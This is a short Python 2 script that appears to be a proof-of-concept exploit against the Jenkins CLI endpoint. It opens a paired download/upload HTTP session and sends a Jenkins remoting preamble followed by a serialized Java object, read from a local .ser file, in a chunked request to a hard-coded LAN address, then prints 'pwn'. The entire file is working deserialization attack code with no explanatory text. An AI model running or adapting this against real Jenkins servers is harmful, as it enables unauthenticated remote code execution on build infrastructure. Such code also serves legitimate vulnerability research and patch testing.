import urllib

import requests
import uuid
import threading
import time
import gzip
import urllib3
import zlib

proxies = {
#  'http': 'http://127.0.0.1:8090',
#  'https': 'http://127.0.0.1:8090',
}

URL='http://192.168.18.161:8080/cli'

PREAMLE='<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
PROTO = '\x00\x00\x00\x00'


FILE_SER = open("jenkins_poc1.ser", "rb").read()

def download(url, session):

    headers = {'Side' : 'download'}
    headers['Content-type'] = 'application/x-www-form-urlencoded'
    headers['Session'] = session
    headers['Transfer-Encoding'] = 'chunked'
    r = requests.post(url, data=null_payload(),headers=headers, proxies=proxies, stream=True)
    print r.text


def upload(url, session, data):

    headers = {'Side' : 'upload'}
    headers['Session'] = session
    headers['Content-type'] = 'application/octet-stream'
    headers['Accept-Encoding'] = None
    r = requests.post(url,data=data,headers=headers,proxies=proxies)


def upload_chunked(url,session, data):

    headers = {'Side' : 'upload'}
    headers['Session'] = session
    headers['Content-type'] = 'application/octet-stream'
    headers['Accept-Encoding']= None
    headers['Transfer-Encoding'] = 'chunked'
    headers['Cache-Control'] = 'no-cache'

    r = requests.post(url, headers=headers, data=create_payload_chunked(), proxies=proxies)


def null_payload():
    yield " "

def create_payload():
    payload = PREAMLE + PROTO + FILE_SER

    return payload

def create_payload_chunked():
    yield PREAMLE
    yield PROTO
    yield FILE_SER

def main():
    print "start"

    session = str(uuid.uuid4())

    t = threading.Thread(target=download, args=(URL, session))
    t.start()

    time.sleep(1)
    print "pwn"
    #upload(URL, session, create_payload())

    upload_chunked(URL, session, "asdf")

if __name__ == "__main__":
    main()
